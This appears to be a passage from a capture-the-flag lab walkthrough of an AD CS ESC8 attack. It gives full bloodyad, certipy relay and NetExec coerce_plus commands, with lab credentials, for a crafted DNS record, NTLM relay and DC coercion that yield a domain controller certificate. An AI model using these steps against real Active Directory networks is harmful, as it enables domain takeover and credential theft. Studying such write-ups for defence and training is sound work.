## Understanding ESC8

ESC8 is an ADCS attack involving NTLM relay against the HTTP certificate enrollment endpoint.

The basic attack chain is:

```text
Victim authenticates to attacker
          |
          v
Attacker captures NTLM authentication
          |
          v
Authentication is relayed to ADCS
          |
          v
ADCS issues a certificate
          |
          v
Certificate authenticates as victim
```

The interesting part here is that we want the domain controller itself to authenticate to us.

If we can coerce the DC machine account to authenticate to our machine, we can relay that authentication to the ADCS web enrollment service.

That gives us a certificate for the domain controller machine account.

The attack therefore becomes:

```text
Rosie.Powell
      |
      v
Malicious DNS record
      |
      v
PetitPotam
      |
      v
DC-JPQ225$ authenticates to attacker
      |
      v
Certipy relay
      |
      v
Certificate for DC-JPQ225$
      |
      v
Kerberos TGT
      |
      v
DCSync
      |
      v
Administrator hash
```

## Creating the Malicious DNS Record

At this point, we have control over DNS records in the `cicada.vl` domain through the `Rosie.Powell` account.

The next step is to create a DNS `A` record containing a specially crafted hostname. The hostname is built from the target computer's NetBIOS name followed by a serialized `CREDENTIAL_TARGET_INFORMATION` structure:

```text
DC-JPQ225
+
1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA
```

Resulting in:

```text
DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA
```

The `UWhRCA...YBAAAA` portion is the recognizable marshaled `CREDENTIAL_TARGET_INFORMATION` payload used in DNS-based SPN spoofing/coercion techniques. The purpose of this crafted name is to make the target treat the attacker-controlled DNS name as a credential target, allowing the coerced authentication to be redirected toward the attacker.

We add an `A` record for this hostname and point it to our Kali VPN address:

```python
bloodyad -u Rosie.Powell -p Cicada123 -d cicada.vl -k --host DC-JPQ225.cicada.vl add dnsRecord DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA 10.10.17.184
```

Breaking the command down:

```text
bloodyad
```

Runs BloodyAD, which we are using to modify Active Directory objects.

```text
-u Rosie.Powell -p Cicada123
```

Authenticates to the domain using the `Rosie.Powell` account.

```text
-d cicada.vl
```

Specifies the Active Directory domain.

```text
-k
```

Tells BloodyAD to use Kerberos authentication.

```text
--host DC-JPQ225.cicada.vl
```

Specifies the domain controller we are communicating with.

```text
add dnsRecord <name> <IP>
```

Creates an `A` record in the AD-integrated DNS zone. The crafted hostname is mapped to our attacker IP, `10.10.17.184`.

The important distinction is:

```text
DC-JPQ225.cicada.vl
        ↓
10.129.61.29
```

is the real target/DC, while the newly created record:

```text
DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA
        ↓
10.10.17.184
```

points to our Kali machine.

This DNS modification alone does not issue a certificate. It prepares the authentication redirection required for the coercion step.

## Starting the Certipy Relay Server

The next part of the chain is **ESC8: NTLM relay to AD CS Web Enrollment**.

AD CS can expose a web enrollment endpoint under `/certsrv/`. When that endpoint accepts relayable authentication, an attacker can start an NTLM relay server, coerce a privileged account to authenticate to it, and forward that authentication to the Certificate Authority. Certipy automates this relay and certificate-request process.

We start Certipy in relay mode:

```python
certipy relay -target 'http://dc-jpq225.cicada.vl/' -template DomainController -subject 'CN=DC-JPQ225,CN=Computer,DC=cicada,DC=vl'
```

The options mean:

```text
relay
```

Starts Certipy's NTLM relay functionality.

```text
-target 'http://dc-jpq225.cicada.vl/'
```

Specifies the AD CS Web Enrollment server that will receive the relayed authentication.

Certipy internally targets:

```text
/certsrv/certfnsh.asp
```

which is the classic Web Enrollment endpoint used for ESC8.

```text
-template DomainController
```

Tells Certipy which certificate template to request after the relay succeeds.

Because the authentication being coerced originates from the Domain Controller computer account, the `DomainController` template is appropriate for obtaining a certificate representing that machine account. Certipy's documentation specifically notes that a DC relay should use the `DomainController` template.

```text
-subject 'CN=DC-JPQ225,CN=Computer,DC=cicada,DC=vl'
```

Specifies the subject to place in the requested certificate.

This is particularly useful with the Certipy version used here because the relayed machine authentication can appear with an empty username to Certipy. Supplying the subject prevents certificate generation from failing because of an empty Common Name.

At this point Certipy listens on TCP/445:

```text
[*] Listening on 0.0.0.0:445
[*] Setting up SMB Server on port 445
```

The relay server is now waiting for the Domain Controller to authenticate to us.

## Coercing the Domain Controller

With the relay listener running, we use NetExec's `coerce_plus` module to force `DC-JPQ225` to initiate an authentication attempt toward our crafted listener name.

```python
nxc smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -d cicada.vl -k -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA
```

Breaking this down:

```text
nxc smb DC-JPQ225.cicada.vl
```

Connects to the target over SMB.

```text
-u Rosie.Powell -p Cicada123 -d cicada.vl
```

Uses the `Rosie.Powell` domain credentials to perform the coercion request.

```text
-k
```

Uses Kerberos for authentication to the target when communicating with the DC.

```text
-M coerce_plus
```

Loads NetExec's `coerce_plus` module.

`coerce_plus` tests and invokes supported Windows RPC-based authentication coercion techniques such as PetitPotam and other coercion primitives.

```text
-o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA
```

This is the critical part.

Instead of specifying our IP address directly, we provide the **crafted DNS hostname** created earlier.

The target is therefore coerced into authenticating to the attacker-controlled destination represented by that hostname. NetExec's documentation and AD attack references show this exact `LISTENER=<crafted-name>` pattern for this technique.

The overall flow is now:

```text
Rosie.Powell
     │
     │ modifies DNS
     ▼
Crafted DNS record
     │
     │ coerced authentication
     ▼
DC-JPQ225$
     │
     │ authentication to crafted listener
     ▼
Kali :445
     │
     │ NTLM relay
     ▼
AD CS Web Enrollment
     │
     │ certificate request
     ▼
DomainController certificate
```
